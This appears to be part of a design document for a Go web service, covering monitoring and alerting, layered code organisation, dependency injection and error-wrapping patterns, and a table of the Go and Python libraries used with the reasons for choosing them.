Monitoring & Logging
Metrics Tracked:

Request latency (P50, P95, P99 percentiles)
Error rate (5xx responses per minute)
WebSocket connection count
Database query performance
Memory/CPU usage per instance
Log Aggregation:

All logs sent to centralized system (e.g., Loki, Elasticsearch)
Structured JSON format:
JSON

{
  "timestamp": "2024-01-15T10:30:00Z",
  "level": "ERROR",
  "trace_id": "a3f7b2c1",
  "user_id": "550e8400...",
  "endpoint": "/api/posts/123/like",
  "error": "database connection timeout",
  "duration_ms": 5000
}
Alerting Rules:

Error rate >1% for 5 minutes → Page on-call engineer
Database CPU >80% → Auto-scale read replicas
WebSocket connections >10,000 → Scale to 3 instances
🔍 Code Organization Principles
Separation of Concerns
Layer Responsibilities:

Handlers (controllers):

Parse HTTP request
Extract parameters
Call service layer
Format HTTP response
NEVER contain business logic or SQL
Services (business logic):

Validate business rules (e.g., "users can't like their own posts")
Orchestrate multiple repository calls
Handle transactions
NEVER know about HTTP or JSON
Repositories (data access):

Execute SQL queries
Map database rows to structs
NEVER contain business logic
Middleware:

Cross-cutting concerns (auth, logging, rate limiting)
Execute before handlers
Can short-circuit request (return error before handler runs)
Dependency Injection
Why It's Used:

Go

// ❌ BAD: Handler directly creates dependencies
func LikeHandler(c *fiber.Ctx) error {
    repo := NewLikeRepository(db)  // Hard to test
    service := NewLikeService(repo)
    // ...
}

// ✅ GOOD: Dependencies passed in (constructor injection)
type LikeHandler struct {
    service *LikeService
}

func NewLikeHandler(service *LikeService) *LikeHandler {
    return &LikeHandler{service: service}
}

// In tests, can pass mock service
func TestLikeHandler(t *testing.T) {
    mockService := &MockLikeService{}
    handler := NewLikeHandler(mockService)
    // Test without real database
}
Error Handling Pattern
Consistent Error Wrapping:

Go

// Repository layer
func (r *UserRepository) FindByUsername(username string) (*User, error) {
    // SQL query...
    if err != nil {
        return nil, fmt.Errorf("query failed: %w", err)
    }
}

// Service layer
func (s *AuthService) Login(username, password string) (string, error) {
    user, err := s.repo.FindByUsername(username)
    if err != nil {
        return "", fmt.Errorf("failed to find user: %w", err)
    }
}

// Handler layer
func (h *AuthHandler) Login(c *fiber.Ctx) error {
    token, err := h.service.Login(username, password)
    if err != nil {
        log.Error("Login failed", "trace_id", traceID, "error", err)
        
        // Determine HTTP status from error type
        if errors.Is(err, ErrUserNotFound) {
            return c.Status(401).JSON(fiber.Map{"error": "Invalid credentials"})
        }
        return c.Status(500).JSON(fiber.Map{"error": "Internal server error"})
    }
}
📚 Third-Party Libraries Used
Go Dependencies
Library	Purpose	Why Chosen
gofiber/fiber	Web framework	Express-like API, fastest Go framework (benchmarks show 6x faster than Gin)
jackc/pgx	PostgreSQL driver	Pure Go, better performance than lib/pq, supports PostgreSQL-specific features
golang-jwt/jwt	JWT handling	Industry standard, 15k+ stars on GitHub, well-maintained
golang.org/x/crypto/bcrypt	Password hashing	Official Go crypto library, constant-time comparison
gorilla/websocket	WebSocket support	Most popular Go WebSocket library, production-tested by companies like Slack
microcosm-cc/bluemonday	HTML sanitization	Whitelist-based (safer than blacklist), used by GitHub
go-redis/redis	Redis client	Official Redis client, supports clustering
google/uuid	UUID generation	Cryptographically secure UUID v4
Python Dependencies (Scripts)
Library	Purpose
psycopg2	PostgreSQL adapter for running migrations
faker	Generate realistic fake data for testing
python-dotenv	Load environment variables from .env file